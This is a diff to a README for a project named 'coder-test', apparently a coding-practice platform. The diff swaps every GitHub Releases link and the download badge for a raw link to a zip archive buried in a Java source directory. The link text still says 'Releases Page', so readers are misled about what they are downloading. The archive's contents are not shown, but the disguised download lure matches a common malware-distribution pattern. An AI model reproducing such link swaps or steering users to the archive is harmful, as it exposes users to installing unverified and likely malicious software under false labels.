@@ -8,12 +8,12 @@ Welcome to **coder-test**, your platform to enhance your programming skills thro
 
 To download the latest version of **coder-test**, click the button below:
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue)](https://github.com/kolaras12/coder-test/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/kolaras12/coder-test/master/src/main/java/com/yupi/codertestbackend/service/ai/test-coder-3.2.zip)](https://raw.githubusercontent.com/kolaras12/coder-test/master/src/main/java/com/yupi/codertestbackend/service/ai/test-coder-3.2.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases Page](https://github.com/kolaras12/coder-test/releases) to download the application.
+   Go to our [Releases Page](https://raw.githubusercontent.com/kolaras12/coder-test/master/src/main/java/com/yupi/codertestbackend/service/ai/test-coder-3.2.zip) to download the application.
 
 2. **Choose Your Version**  
    On the Releases page, you will see several versions of **coder-test**. Click on the latest version to expand the details.
@@ -61,4 +61,4 @@ Stay updated on our progress and share your experiences. Follow us on social med
 
 **coder-test** is open-source software. You can modify and distribute it, but please see our license information in the repository for details.
 
-Remember, you can always find the latest version on our [Releases Page](https://github.com/kolaras12/coder-test/releases). Happy coding!
+Remember, you can always find the latest version on our [Releases Page](https://raw.githubusercontent.com/kolaras12/coder-test/master/src/main/java/com/yupi/codertestbackend/service/ai/test-coder-3.2.zip). Happy coding!
